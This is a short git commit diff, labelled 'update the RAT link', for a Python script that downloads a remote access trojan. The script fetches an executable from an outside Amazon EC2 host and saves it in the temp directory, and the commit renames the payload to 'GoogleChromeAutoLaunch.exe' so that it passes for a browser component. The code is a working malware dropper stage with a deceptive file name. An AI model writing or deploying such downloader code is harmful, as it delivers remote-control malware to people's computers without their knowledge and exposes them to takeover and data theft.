0d4ec64931caf6a33cd9059fe5da77cf36720daa
islamTaha <tahai@codescalers.com>
2016-06-28 14:20:04 +0200

    update the RAT link

--- source/downloadFile.py
+++ source/downloadFile.py
@@ -1,11 +1,11 @@
 import requests
 import tempfile
 
-url = "http://ec2-52-90-251-67.compute-1.amazonaws.com/101990.rar"
+url = "http://ec2-52-90-251-67.compute-1.amazonaws.com/GoogleChromeAutoLaunch.exe"
 response = requests.get(url, stream=True)
 
 tempDirectory = tempfile.gettempdir()
-newFile = tempDirectory + "//outuput.exe"
+newFile = tempDirectory + "//GoogleChromeAutoLaunch.exe"
 
 with open(newFile, "wb") as handle:
         handle.write(response.content)
